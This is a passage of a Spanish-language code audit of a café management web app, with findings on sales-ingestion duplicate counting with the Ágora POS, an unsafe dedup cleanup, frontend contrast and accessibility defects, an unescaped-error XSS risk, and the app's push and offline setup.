**Problema:** La proyección del mes multiplica el resultado acumulado por diasDelMes/diasTranscurridos con diasTranscurridos clampado a 1. El día 1 (o si el conector solo trae unas horas) eso extrapola ×30,4 un único día. Mismo patrón en cuenta-resultados.componer (proyección) y en dashboard-ceo.prevCierreMes. No es NaN (está protegido), pero sí una extrapolación inestable.

**Impacto:** Los primeros 1-3 días del mes la 'previsión de cierre de mes' y la proyección de beneficio pueden mostrar cifras disparatadas (un buen o mal día 1 × 30), confundiendo a quien abre la portada a primeros de mes.

**Recomendación:** No proyectar (o marcar 'aún sin base fiable') hasta tener p. ej. ≥3 días abiertos, o amortiguar con la media del mismo periodo del mes anterior hasta que haya recorrido suficiente. Mostrar siempre el acumulado real junto a la proyección.

---

## 5 · Ingesta Ágora, conciliación y descuadre con Ágora

**Cómo funciona hoy:** El conector (un agente Node en el PC del local, conector-agora/conector.js) lee el export de Ágora (Invoices + DeliveryNotes + SalesOrders) y lo EMPUJA por HTTPS a Control M en POST /tpv/ingest (alias /agora/ingest), autenticado con la clave del conector (server.js:241-253, tpv-connector.js). El motor central es agora.importarDocs: es idempotente por documento (claveIdem = GlobalId, o type:Serie:Number), omite SalesOrders (pedidos no son venta cerrada), resta las líneas con cantidad negativa (devoluciones), bloquea el ticket entero si algún producto no está vinculado, descuenta stock por escandallo y registra cada venta con su neto; además lleva un anti-duplicado extra por "bizKey" = Serie|Número|día que cruza vías (p.ej. export manual TicketExport vs conector Invoice). Conviven otras vías: la heredada agora.importarVentas (CSV plano, SIN idempotencia) usada como fallback manual (ventas.js:33), por cron horario AGORA_CSV_PATH (server.js:505-506) y por email de CSV plano (ventas-email.js:77); y el export "Análisis de Ventas" jerárquico que entra por ventas-export.importarReemplazando (borra y reconstruye el mes, idempotente). El cuadre albarán/factura NO se resuelve en ingesta: existe una conciliación MANUAL de admin (conciliacion-ventas.js) que detecta y limpia "duplicados estructurales" por firma (mismos productos+importe bajo >1 tipo de documento), repone stock y marca el doc como dedup; se dispara con un botón en la portada (frontend/index.html:12051, :12088).

**Salud:** Regular-mala en el punto crítico: el descuadre albarán+factura sigue ABIERTO en ingesta (bizKey no cruza nºs distintos) y, peor, la limpieza manual que debería arreglarlo es insegura: colapsa a 1 cualquier grupo de tickets idénticos que cruce tipos, borrando ventas reales (dinero) si hay dos mesas iguales el mismo día. Además persisten varias vías de duplicación sin idempotencia (fallback/cron/email plano) y no se restan descuentos/invitaciones. Hoy no se puede confiar en el total de Control M "al céntimo" frente a Ágora.

### agora.1 · La limpieza de duplicados por firma colapsa a 1 y BORRA ventas reales si hay dos tickets idénticos cruzando tipos

**🔴 CRÍTICO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* conciliación / limpieza

*Ubicación:* `backend/conciliacion-ventas.js:211-217 (limpieza) y :130-144 (informe)`

```js
Object.values(porFirma).forEach((grupo) => {
    const tipos = new Set(grupo.map((t) => t.tipo));
    if (grupo.length < 2 || tipos.size < 2) return;
    const ordenado = grupo.slice().sort((a, b) => prioTipo(b.tipo) - prioTipo(a.tipo) || (a.hora || "").localeCompare(b.hora || ""));
    ordenado.slice(1).forEach((t) => clavesAEliminar.push(t.clave));
  });
```

**Problema:** Agrupa todos los tickets del día con la MISMA firma (productos+importe) y, si el grupo cruza >1 tipo de documento, asume que es UNA sola venta: se queda 'ordenado[0]' (la factura de mayor prioridad) y elimina 'ordenado.slice(1)' = TODO lo demás. Si hay dos mesas idénticas (misma comanda, mismo importe) y cada una llega como albarán Y factura, el grupo tiene 4 tickets con la misma firma (2 facturas + 2 albaranes): el código deja 1 y borra 3, cuando lo correcto es dejar 2 facturas y borrar 2 albaranes. El nº de ventas reales de un grupo es el máximo recuento por tipo, no 1. conciliacionDia (:130-144) comete el mismo error e informa un 'total_duplicado' inflado que invita a pulsar el botón.

**Impacto:** En un café es habitual tener dos tickets idénticos el mismo día (p.ej. dos 'cortado + tostada' a la misma hora y precio). Con el dual albarán/factura activo, pulsar 'Quitar duplicados y reponer stock' (es un botón de un clic con confirm, frontend:12088) borra la segunda venta real: desaparece su ingreso del P&L y se repone stock que SÍ se consumió. La pérdida es silenciosa y pegajosa: el doc queda marcado dedup/processed, así que el conector no lo reenvía (solo se recupera reimportando el mes completo). Infra-contar ingresos es peor que sobre-contar: lleva a decisiones de precio/compra equivocadas.

**Recomendación:** No reducir el grupo a 1. Emparejar dentro de cada firma por recuento por tipo: ventas reales = max(recuento por tipo); emparejar cada doc de menor prioridad (albarán/pedido) con uno de mayor prioridad (factura) y eliminar SOLO los sobrantes emparejados; nunca dejar menos documentos que ventas reales. Añadir test: 2 albaranes + 2 facturas idénticos del día → quedan 2 facturas (total_duplicado = 2 albaranes), no 1.

### agora.2 · El doble conteo albarán+factura sigue abierto en la ingesta (bizKey no cruza números distintos)

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* ingesta / idempotencia

*Ubicación:* `backend/agora.js:214-217 (bizKey) y :243-249 (dedup)`

```js
const bizKey = (s, n, f) => {
    const num = parseInt(String(n == null ? "" : n).replace(/[^0-9]/g, ""), 10);
    return `${String(s == null ? "" : s).trim()}|${Number.isFinite(num) ? num : 0}|${String(f || "").slice(0, 10)}`;
  };
  ...
  const bk = bizKey(serie, number, fecha);
  if (serie != null && number != null && ventasBiz.has(bk)) {
```

**Problema:** El anti-duplicado por clave de negocio usa Serie|Número|día. La misma venta que entra como DeliveryNote y como Invoice tiene NÚMEROS DISTINTOS (p.ej. albarán T/55 y factura T/100), así que generan bizKeys distintos y AMBAS se registran como venta. claveIdem (type:Serie:Number) tampoco las cruza. No hay ninguna deduplicación automática albarán↔factura; solo la conciliación manual (que además está rota, ver hallazgo crítico). Esta es la causa raíz del descuadre conocido (~20 € más que 'VENTAS HOY' de Ágora).

**Impacto:** Cada día que Ágora emite albarán Y factura de la misma venta, el titular de 'ventas' de Control M (con IVA) queda por encima del real: la fundadora ve ingresos inflados en la portada y el P&L. El desajuste crece con el volumen y obliga a cuadrar a mano a diario.

**Recomendación:** Dedupe seguro por VÍNCULO, no por firma: aprovechar la relación que Ágora ya expone entre factura y su albarán de origen (campos tipo DeliveryNoteId / SourceDocument / References en el Invoice) para marcar el albarán como no-venta cuando existe su factura. Alternativa robusta sin ese campo: en días con facturas, contar SOLO facturas (los albaranes de ventas ya facturadas no se suman). Nunca colapsar por 'firma' (no distingue dos mesas iguales).

### agora.3 · Vía heredada importarVentas sin idempotencia sigue viva (fallback manual + cron horario + email CSV plano)

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* ingesta / idempotencia

*Ubicación:* `backend/agora.js:84-95 y :353-364 (cron); backend/routes/ventas.js:33; backend/ventas-email.js:77`

```js
ventas.push({
      id: store.nextId("ven", "ventas"),
      producto_id: producto.id,
      producto: producto.nombre,
      cantidad,
      importe,
      fecha,
      fuente,
      importado_en: new Date().toISOString(),
    });
```

**Problema:** importarVentas inserta cada fila del CSV como venta nueva SIN doc_clave, sin Serie/Número y sin ninguna comprobación de duplicados. Se alcanza por tres caminos aún activos: (1) fallback de /api/ventas/importar cuando el CSV no es jerárquico (ventas.js:33, fuente 'manual'); (2) cronImport horario que lee AGORA_CSV_PATH y hace importarVentas(texto,'cron') (agora.js:359, cableado en server.js:505-506); (3) email con CSV plano (ventas-email.js:77, fuente 'email'). Reimportar el mismo fichero duplica todo; si AGORA_CSV_PATH apunta a un fichero fijo, duplica cada hora. Estas ventas sin doc_clave tampoco las cruza bizKey (solo indexa las que tienen doc_serie/number, agora.js:219).

**Impacto:** Un reenvío/reimport accidental o un cron mal configurado infla los ingresos del mes de forma invisible (no el %, pero sí el € del P&L). La migración migracion-ventas-dup.js solo limpia meses que YA tienen ventas con doc_clave; un mes cargado solo por esta vía queda con los duplicados dentro.

**Recomendación:** Enrutar TODAS las subidas por el motor idempotente (importarReemplazando o importarDocs). Que cronImport use importarReemplazando o lleve control del fichero ya procesado; mejor aún, retirar importarVentas y el cron de AGORA_CSV_PATH si ya no se usan. Dar siempre doc_clave/bizKey a toda venta registrada.

### agora.4 · bizKey ignora el tipo de documento: puede COLAPSAR dos ventas reales distintas con mismo Serie+Número de distinto tipo

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: media

*Área:* ingesta / idempotencia

*Ubicación:* `backend/agora.js:216 (clave sin tipo) y :244 (dedup)`

```js
return `${String(s == null ? "" : s).trim()}|${Number.isFinite(num) ? num : 0}|${String(f || "").slice(0, 10)}`;
  ...
  if (serie != null && number != null && ventasBiz.has(bk)) {
```

**Problema:** bizKey deja fuera el type a propósito (para cruzar TicketExport↔Invoice), pero albaranes y facturas suelen tener SECUENCIAS DE NUMERACIÓN INDEPENDIENTES. Si un albarán tiene Serie=T Número=50 y una factura (de OTRA venta) tiene Serie=T Número=50 el mismo día, la segunda que se procese cae en el dedup y se DESCARTA como 'ya existente', perdiendo una venta real. Es el riesgo espejo del doble conteo: según cómo numere Ágora, bizKey puede sobre-contar (hallazgo alto) o infra-contar (este).

**Impacto:** Pérdida silenciosa de ventas reales los días en que coincide un albarán y una factura no relacionados con el mismo número. Difícil de detectar porque Control M lo marca 'procesado' y lo confirma a Ágora.

**Recomendación:** Incluir el tipo de documento en la clave de dedupe (o resolver el cruce por vínculo albarán↔factura, ver hallazgo alto). Si se mantiene el cruce TicketExport↔Invoice, limitarlo a esos dos tipos, no a todo par Serie+Número.

### agora.5 · Descuentos e invitaciones no se restan: no se lee ningún campo de descuento a nivel documento

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: media

*Área:* ingesta / dinero

*Ubicación:* `backend/agora.js:256-261 (lectura de línea)`

```js
const importeRaw = numJSON(campoDoc(ln, ["TotalAmount", "Amount", "amount", "Total", "total", "importe", "GrossAmount", "UnitPrice", "ProductPrice", "price", "precio", "pvp"]));
      // Neto (base sin IVA) si el documento lo trae...
      const netoRaw = campoDoc(ln, ["Base", "base", "NetAmount", "net", "neto", "BaseAmount", "importe_neto"]);
```

**Problema:** Al mapear cada línea solo se buscan importes brutos/netos; no se lee ningún descuento de línea (DiscountAmount) ni descuento/invitación a nivel de documento. Si Ágora aplica un descuento porcentual o una invitación sobre el ticket y las líneas vienen a PVP (pre-descuento), Control M suma de más frente a 'VENTAS HOY' de Ágora, que sí va neto de descuentos. Las invitaciones a 0 € sí entran bien (importe 0), pero un 'cierre con descuento' no. La propia app ya contempla 'invitacion_no_autorizada'/'descuentos' en el cierre de caja (cierre-caja.js:35,98), señal de que el negocio los usa.

**Impacto:** Otro sumando del descuadre al alza cada vez que hay promociones, descuentos de personal o invitaciones aplicadas en el TPV. Infla ingresos y baja el food cost aparente.

**Recomendación:** Leer y restar el descuento de línea y el descuento/invitación de documento que exponga Ágora (p.ej. DiscountAmount, Discount, Invited/Gift) al calcular importe y neto. Verificar con un export real qué campos trae el conector y añadir un test de ticket con descuento/invitación.

### agora.6 · La idempotencia depende de un solo proceso: con ≥2 réplicas o peticiones concurrentes se rompe

**🟡 MEDIO** · estado: abierto · esfuerzo: L · confianza: media

*Área:* idempotencia / despliegue

*Ubicación:* `backend/agora.js:189 y :218-219`

```js
const procesadosPrev = new Set(docsAgora.filter((d) => d.status === "processed").map((d) => d.id));
  ...
  const ventasBiz = new Set();
  ventas.forEach((v) => { if (v.doc_serie != null || v.doc_number != null) ventasBiz.add(bizKey(v.doc_serie, v.doc_number, v.fecha)); });
```

**Problema:** El dedupe se construye en memoria (procesadosPrev, ventasBiz) a partir del estado leído al inicio de la llamada; no hay una restricción única en BD sobre doc_clave. Dos ingestas del mismo lote servidas en paralelo (o por dos instancias en Render) pueden pasar ambas la comprobación antes de escribir y registrar la venta dos veces. Ya anotado como riesgo abierto en AUDITORIA-2026-10.md:208-209.

**Impacto:** Doble conteo intermitente difícil de reproducir si algún día hay más de una réplica o un reintento solapado del conector. Mina la promesa de 'una sola fuente de verdad para el dinero'.

**Recomendación:** Garantizar réplicas=1 en Render mientras la idempotencia sea en memoria, o mover la unicidad a la BD (índice UNIQUE sobre doc_clave en ventas y sobre id en docs_agora) para que el propio almacén rechace el duplicado.

### agora.7 · Las ventas heredadas sin doc_clave quedan fuera del cuadre y de la limpieza

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* conciliación

*Ubicación:* `backend/conciliacion-ventas.js:200-201`

```js
const key = v.doc_clave;
    if (!key) return; // sin documento no se concilia (no se toca)
```

**Problema:** limpiarDuplicados salta toda venta sin doc_clave y conciliacionDia las mete en tickets sueltos '(sin doc) id' que nunca agrupan por firma. Así, las ventas de la vía heredada (fallback/cron/email plano, ver hallazgo alto) son invisibles al cuadre: si están duplicadas, ni se detectan ni se pueden limpiar desde esta pantalla.

**Impacto:** El admin puede ver 'sin doble conteo estructural' y seguir descuadrado con Ágora porque el exceso vive en ventas sin documento que la herramienta no mira.

**Recomendación:** Incluir en el cuadre/limpieza las ventas sin doc_clave (o migrarlas a doc_clave), y al menos avisarlas en la conciliación como 'ventas sin documento' para que no pasen desapercibidas.

---

## 6 · Frontend, UX y accesibilidad

**Cómo funciona hoy:** Control M es una PWA móvil-primero de un ÚNICO fichero frontend/index.html (13.852 líneas, vanilla JS, sin framework ni bundler). Define ~20 tokens de color en :root (línea 42-81: --cream #F1EEE6, --ink #1B1B16, --olive #45443D, --muted #86847A, etc.) con un tema papel cálido/grafito y la regla de marca "el verde oscuro solo vive en el marco". El acceso admin/equipo se decide en front con mbdsEsAdmin(). Toda llamada al backend pasa por async function api(path,opts) (línea 2563) que hace fetch, lanza Error con el mensaje del servidor si !r.ok, y recarga la sesión en 401; cada pantalla la envuelve en try/catch y pinta el error con setInner(`<div class="err">${e.message}</div>`) o alert(e.message). La navegación es rail lateral ≥1281px y barra inferior <1281px. Hay <html lang="es">, viewport correcto, :focus-visible global (línea 1547) y soporte de prefers-reduced-motion (1549): buena base. No hay ESLint/Prettier/Stylelint (devDependencies solo trae @playwright/test); el único control de calidad es CI=true npm test (unit + e2e Playwright).

**Salud:** Base sólida (lang, focus-visible, reduced-motion, anti-doble-envío, esc() existe) pero con un defecto de contraste GRAVE y transversal en el botón primario que afecta a las 105 acciones "Guardar/Crear" de toda la app en móvil, más huecos de accesibilidad por teclado en los flujos diarios (apertura/cierre, caja) y cero manejo de red offline. Son arreglos de bajo esfuerzo y alto retorno; la salud es "funcional pero con fricción diaria real para el equipo".

### frontend.1 · El botón primario es casi ilegible en móvil (texto #23281E sobre --olive #45443D ≈ 1.5:1)

**🔴 CRÍTICO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Contraste / acción principal

*Ubicación:* `frontend/index.html:1561-1564 (token en :45, hover en :1568-1569)`

```js
.btn-primary, .btn-warn {
  background: var(--olive) !important;
  border: 1px solid var(--olive) !important;
  color: #23281E !important;
/* --olive: #45443D (línea 45) ; hover: background:#B7C77E (línea 1569) */
```

**Problema:** El texto del botón primario (#23281E, verde casi negro) va sobre fondo --olive #45443D (grafito oscuro). El ratio de contraste es ~1.54:1, muy por debajo del mínimo WCAG AA de 4.5:1. Solo se vuelve legible en :hover, cuando el fondo pasa a #B7C77E (verde claro), pero NO hay @media (hover:hover): en pantalla táctil (el uso principal) el :hover nunca ocurre, así que el botón queda SIEMPRE en el estado ilegible. Esta regla gana con !important sobre las definiciones previas (líneas 355-357, 924).

**Impacto:** Es el estilo de las 105 acciones principales de la app (Guardar ficha, Guardar cata, Guardar lote, Crear, Confirmar...). En el móvil del mostrador el camarero ve un botón oscuro con el texto prácticamente invisible: tiene que adivinar qué pone antes de guardar un cierre de caja, una receta o un lote APPCC. Es el fallo de UX más caro del front y afecta a cada flujo.

**Recomendación:** Separar estado de reposo y hover con contraste real: para reposo usar texto claro sobre --olive (p. ej. color:var(--cream) #F1EEE6 → ~9:1) o invertir a fondo claro con texto --ink. Añadir @media (hover:hover) para que el hover solo cambie en dispositivos con puntero. Verificar con una comprobación automática de contraste.

### frontend.2 · Flujos diarios no operables por teclado ni lector de pantalla (div/span onclick sin role/tabindex)

**🟠 ALTO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: alta

*Área:* Accesibilidad por teclado

*Ubicación:* `frontend/index.html:7016 (apertura/cierre), 12609 (calendario caja), 13208 (chips alérgenos), 12653 (toggle albaranes)`

```js
// 7016 checklist apertura/cierre:
return `<div class="apstep${done?' done':''}" onclick="toggleApertura('${p.k}',${done?false:true})">
// 13208 chip alérgeno:
`<span class="alerg-chip..." data-alerg="${esc(a)}" onclick="this.classList.toggle('on')">${esc(a)}</span>`
// 12609 celda calendario caja:
`<div class="cja-cal-d${c?" on":""}" ${c?`onclick="cjaAbrir('${c.id}')"`:""} title="${fecha}">`
```

**Problema:** Elementos interactivos construidos como <div>/<span> con onclick, sin role="button", sin tabindex="0" y sin manejador de teclado (Enter/Espacio). El CSS .apstep (línea 1366: width:100%; text-align:left; border:0) delata que antes eran <button>. El chip de alérgenos además guarda su estado solo en la clase CSS .on, sin aria-pressed ni checkbox, así que un lector de pantalla no sabe que es un toggle ni si está activo. El patrón correcto SÍ existe en otras tarjetas (líneas 8769 y 8934 usan role="button" tabindex="0"), lo que confirma que es una inconsistencia, no una decisión.

**Impacto:** La rutina de apertura y cierre (el checklist que el equipo usa cada día) y el calendario de cierre de caja no se pueden marcar con teclado ni con lector de pantalla; un empleado con lector no puede completar su turno ni un responsable auditar la caja. También falla la edición de alérgenos (dato de seguridad alimentaria): un chip sin semántica de estado puede llevar a etiquetar mal un alérgeno.

**Recomendación:** Convertir estos elementos en <button type="button"> (quita problema de raíz, hereda teclado y foco) o, si debe seguir siendo div/span, añadir role="button" tabindex="0" + keydown para Enter/Espacio; para el chip usar aria-pressed sincronizado con la clase .on. Reutilizar el patrón ya presente en líneas 8769/8934.

### frontend.3 · Sin manejo de red offline: el usuario ve "Failed to fetch" crudo en inglés

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Manejo de errores / red

*Ubicación:* `frontend/index.html:2571 (api) y catch repartidos (2885, 2919, 3000, 7110, 8102...)`

```js
// api() línea 2571 — si no hay red, fetch lanza TypeError('Failed to fetch') antes de poder traducir:
const r = await fetch(API + path, Object.assign({}, opts, { headers }));
// y los catch lo muestran tal cual:
}catch(e){setInner(`<div class="err">${e.message}</div>`);}   // → "Failed to fetch"
```

**Problema:** No existe NINGÚN manejo de estado online/offline: una búsqueda en todo el fichero de navigator.onLine y de los eventos 'online'/'offline' no devuelve resultados. Cuando falla la red, fetch() lanza TypeError('Failed to fetch') (Chrome/Android), que sube sin traducir y se pinta literal. No hay banner de conexión, ni reintento, ni distinción entre "sin internet" y "error del servidor".

**Impacto:** En hostelería el wifi del local se cae a menudo. El camarero ve "Failed to fetch" en inglés en mitad de un cierre de caja o un pedido, sin saber si se guardó, si debe reintentar o si es un fallo de la app. Genera llamadas a la dueña y pérdida de confianza en la herramienta.

**Recomendación:** En api(), envolver fetch en try/catch y relanzar un mensaje en español ("Sin conexión. Revisa el wifi y reintenta.") cuando el error sea de red. Añadir un listener de window 'online'/'offline' que muestre un banner persistente y, opcionalmente, deshabilite acciones de escritura mientras no haya red. El sw.js ya está, así que cabe una estrategia offline básica.

### frontend.4 · esc() inconsistente al pintar mensajes de error (${e.message} sin escapar) — riesgo de inyección

**🟡 MEDIO** · estado: parcial (arreglado a medias) · esfuerzo: S · confianza: alta

*Área:* Escapado / seguridad front

*Ubicación:* `frontend/index.html:2885, 2919, 2939, 3000, 3042, 4052... (50 casos) vs 3121, 5294 (escapados)`

```js
// SIN escapar (50 ocurrencias):
}catch(e){ setInner(`<div class="err">${e.message}</div>`); }
// CON escapar (23 ocurrencias) — demuestra que el patrón correcto ya se conoce:
} catch (e) { out.innerHTML = `<div class="err">${esc(e.message)}</div>`; }
```

**Problema:** La app define esc() (línea 2585) y la regla de proyecto obliga a escapar todo contenido dinámico, pero hay 50 catch que inyectan e.message directamente en innerHTML/setInner sin esc(), frente a 23 que sí lo hacen. e.message procede en última instancia de e.error del servidor (api() línea 2577). Si cualquier mensaje de error contiene <, > o comillas, se interpreta como HTML.

**Impacto:** Dos efectos: (1) incumple la regla de escapado del proyecto de forma inconsistente, lo que hace el código frágil; (2) si un endpoint devolviera (hoy o en el futuro, p. ej. al reflejar un nombre de fichero o un dato de proveedor) un error con HTML, se ejecutaría en el DOM del admin — riesgo de XSS reflejado. Además suele acompañar al mensaje en inglés del punto anterior.

**Recomendación:** Unificar a `<div class="err">${esc(e.message||String(e))}</div>` en los 50 casos, o mejor crear un helper mostrarError(e) que escape y traduzca de una vez. Un linter (ver hallazgo del fichero único) detectaría estos casos automáticamente.

### frontend.5 · Badges de estado del Lab con bajo contraste (texto #1a1f16 sobre fondos oscuros)

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Contraste / Lab

*Ubicación:* `frontend/index.html:1829 (.lab-estado), 5316-5319 (colores), 5487 (uso)`

```js
.lab-estado { ... font-weight:800; color:#1a1f16; ... }   // línea 1829
// mapa de estado (5316-5319):
prueba:{t:"Prueba",c:"#c79a3a"}, aprobado:{t:"Aprobado",c:"var(--olive)"}, carta:{t:"En carta",c:"#3f6079"}, archivado:{t:"Archivado",c:"var(--muted)"}
// uso (5487): <span class="lab-estado" style="background:${est.c};">${est.t}</span>
```

**Problema:** El badge pinta texto #1a1f16 (negro-verdoso, 9px, mayúsculas) sobre el color de estado. Con aprobado = var(--olive) #45443D el contraste es ~1.6:1 y con "En carta" = #3f6079 (azul medio) ~2.7:1; ambos por debajo del 4.5:1 que exige AA para texto pequeño. Solo "Prueba" (#c79a3a) y "Archivado" (--muted) pasan.

**Impacto:** En las fichas de cocina (sándwiches, tostas, bases), el estado "Aprobado" y "En carta" —los más importantes para saber qué se puede vender— quedan casi ilegibles. El equipo puede confundir el estado de un producto y servir/no servir algo por error.

**Recomendación:** Para los fondos oscuros (aprobado, carta) usar texto claro (color:var(--cream)) en lugar de #1a1f16; o fijar un par texto/fondo por estado que supere 4.5:1. Centralizar esos colores de estado como tokens semánticos (ver hallazgo de deriva de color).

### frontend.6 · Objetivos táctiles pequeños en la barra superior (.tb-act ~28px, .tb-icon ~27px)

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* Táctil / ergonomía

*Ubicación:* `frontend/index.html:1061-1068`

```js
.tb-act { ... font-size: 12px; ... padding: 8px 7px; ... }
.tb-icon { ... padding: 6px; ... }  /* svg 15-17px */
```

**Problema:** inicio/buscar (.tb-act) tienen padding 8px 7px → ~28px de alto efectivo; el engranaje de ajustes (.tb-icon) padding 6px sobre svg 15-17px → ~27px. Quedan por debajo del objetivo táctil cómodo de 44x44 (iOS) / 48x48 (Android). Superan el mínimo de WCAG 2.5.8 (24px) pero no el tamaño recomendado. La barra inferior (.tab) sí está bien dimensionada.

**Impacto:** En una PWA de mostrador usada con prisa y a veces con las manos ocupadas/húmedas, pulsar ajustes o buscar falla con frecuencia y obliga a reintentar. Fricción menor pero diaria.

**Recomendación:** Subir el área táctil a ≥44px: aumentar padding (p. ej. 12px) o fijar min-height/min-width:44px con el icono centrado, sin agrandar el glifo visual. La barra superior mide 94px, hay sitio de sobra.

### frontend.7 · Deriva de color: 476 hex inline frente a ~20 tokens, con duplicados casi idénticos

**⚪ BAJO** · estado: abierto · esfuerzo: L · confianza: alta

*Área:* Sistema de diseño

*Ubicación:* `frontend/index.html (ej. 737 #1d1b12, 841 #c4bda4, 925 #2c2920, 5316 #c79a3a, 12600 #9c7a2e, 12867 #888070)`

```js
// mismos grises cálidos que --muted #86847A, repetidos a mano:
#8a8577 (x38), #888070 (x13), #8a8770 (x4)
// mismos verdes/rojos de estado sin token:
#3c7a4a, #6b7a3a, #5C6145, #6a7052, #4a5a2e  //  #b23b3b, #D62A1C, #B5321F
```

**Problema:** El fichero tiene 476 ocurrencias de color hex inline frente a ~20 tokens en :root, con muchos valores casi iguales (varios grises ≈ --muted, varios verdes y rojos de estado sin unificar). La propia CLAUDE.md fija una paleta de marca estricta, pero el código la esquiva con hex sueltos.

**Impacto:** Hace imposible ajustar el tema de forma coherente (un cambio de marca obliga a buscar y reemplazar 476 veces), produce inconsistencias visibles (grises y verdes ligeramente distintos entre pantallas) y es el caldo de cultivo de los fallos de contraste de arriba, que nacen precisamente de hex inline fuera del sistema.

**Recomendación:** Promover los colores recurrentes a tokens semánticos (--sev-ok ya existe pero se ignora; crear --badge-aprobado, etc.) y sustituir los hex duplicados por var(). Hacerlo por módulos. Un stylelint con regla de 'colores permitidos' evita la regresión.

### frontend.8 · Código muerto: función labPanel() y CSS .lab-panel nunca usados

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Mantenimiento

*Ubicación:* `frontend/index.html:3946-3955 (función), 1195-1207 (CSS)`

```js
function labPanel(titulo, lista, onclick){
  return `<button class="lab-panel" onclick="${onclick}">...`;
}
// búsqueda de 'labPanel' en el fichero: solo aparece la definición, 0 llamadas.
// 'class="lab-panel"' aparece 1 vez: dentro de la propia función muerta.
```

**Problema:** labPanel() está definida pero no se invoca en ningún sitio (la que se usa de verdad es labRow(), con 11 llamadas). Su CSS asociado .lab-panel (líneas 1195-1207) tampoco se aplica a nada vivo.

**Impacto:** Ruido en un fichero ya enorme: confunde a quien mantiene (parece una pieza activa), y al no haber linter nadie lo detecta. Bajo impacto funcional, pero suma a la carga cognitiva del fichero único.

**Recomendación:** Eliminar la función labPanel() y el bloque CSS .lab-panel. Confirmar con una búsqueda previa de 'labPanel' y 'lab-panel' (ya hecha: 0 usos reales).

### frontend.9 · Fichero único de 13.852 líneas sin ningún linter (JS ni CSS)

**⚪ BAJO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Calidad / tooling

*Ubicación:* `frontend/index.html (completo); package.json (devDependencies)`

```js
// package.json devDependencies:
"devDependencies": { "@playwright/test": "^1.56.1" }
// no hay eslint / prettier / stylelint / htmlhint; ni .eslintrc ni config alguna
```

**Problema:** Todo el front vive en un fichero de ~14k líneas con vanilla JS y sin análisis estático. Las convenciones de prefijo (lim*/spz*/lab*/cja*/pwz*...) y el aviso de CLAUDE.md sobre colisiones ya ocurridas (wiz-, crono*) son controles manuales. No hay forma automática de detectar funciones muertas (labPanel), variables sin usar, esc() olvidado, colisiones de prefijo o typos.

**Impacto:** Cada hallazgo anterior (esc() inconsistente, código muerto, hex duplicados) es justo el tipo de defecto que un linter atrapa en segundos. Sin él, el riesgo crece con cada edición y la revisión recae por completo en los tests, que no cubren estilo ni accesibilidad.

**Recomendación:** Añadir ESLint (reglas no-unused-vars, no-undef) y Stylelint (color duplicado, propiedades inválidas) como paso de npm test; opcionalmente Prettier. No requiere trocear el fichero: basta con analizarlo. Es la palanca de mayor retorno para frenar la deriva.

### frontend.10 · Checkmark invisible en pasos completados (✓ color --ink sobre fondo --ink)

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Contraste / detalle visual

*Ubicación:* `frontend/index.html:1369 (CSS), 7017 (render del ✓)`

```js
.apstep.done .apstep-check { background: var(--ink); border-color: var(--ink); color: var(--ink); }
// línea 7017 renderiza el tilde dentro del círculo:
<span class="apstep-check">${done?'✓':''}</span>
```

**Problema:** Al marcar un paso como hecho, el ✓ se pinta con color:var(--ink) #1B1B16 sobre background:var(--ink) #1B1B16: tinta sobre tinta, invisible (1:1). El estado "hecho" solo se comunica por el círculo relleno oscuro y el tachado del título (línea 1370); el tilde que el código se molesta en dibujar nunca se ve.

**Impacto:** Pequeño: el usuario aún distingue hecho/no hecho por el círculo lleno y el tachado, pero el refuerzo visual del ✓ se pierde y delata el mismo descuido de contraste que el botón primario.

**Recomendación:** Cambiar color del tilde a var(--cream) en .apstep.done .apstep-check para que el ✓ blanco resalte sobre el círculo oscuro.

### frontend.11 · Resto latente: .btn-primary base declara color igual al fondo (var(--ink) sobre var(--ink))

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Contraste / limpieza CSS

*Ubicación:* `frontend/index.html:355-357`

```js
.btn-primary {
  background: var(--ink);
  color: var(--ink);
  ...
```

**Problema:** La primera definición de .btn-primary pone texto y fondo del mismo color (--ink #1B1B16). Hoy queda tapada por overrides posteriores (línea 924 color:var(--cream) y, sobre todo, línea 1564 con !important), así que no se ve en pantalla, pero es un resto confuso y peligroso: cualquier cambio futuro que elimine el !important deja el botón totalmente negro.

**Impacto:** Nulo ahora mismo; es deuda técnica que puede resucitar el fallo de contraste del botón primario si se refactoriza la cascada. Síntoma del mismo problema de tener 3 definiciones compitiendo del mismo selector.

**Recomendación:** Al arreglar el hallazgo crítico del botón, unificar las 3 definiciones de .btn-primary (355, 924, 1561) en una sola fuente de verdad y borrar la línea 357 errónea.

---

## 7 · PWA, push, offline y temporizadores sous-vide

**Cómo funciona hoy:** La PWA se instala con un Service Worker (frontend/sw.js) cuyo ÚNICO fin es cumplir el criterio de instalabilidad de Android/Chrome: el handler de 'fetch' es un passthrough puro que no cachea nada (self.addEventListener("fetch", () => {})), así que la app siempre carga en vivo desde el servidor. Los avisos push usan web-push (backend/push.js): las claves VAPID se leen de variables de entorno o, si no existen, se generan y guardan en la entidad config (doc "vapid") — que solo persiste con Postgres. Cuando el equipo arranca un temporizador sous-vide (svtStart en index.html), el front: (1) cuenta atrás en memoria con beep/vibración/Notification local, y (2) hace POST /api/avisos/temporizador, que agenda en backend/sv-timers.js un setTimeout en memoria (jobs Map) que a la hora de fin llama push.enviarATodos con title "⏰ Retira: <label>". El SW recibe el push y muestra la notificación del sistema aunque la app esté cerrada. El servidor corre en Render (que se duerme por inactividad); un cron horario de GitHub Actions llama /avisos/cron, pero ese cron solo dispara el recordatorio diario de pedidos, NO los temporizadores sous-vide. Al reiniciar, server.js llama sv-timers.init().

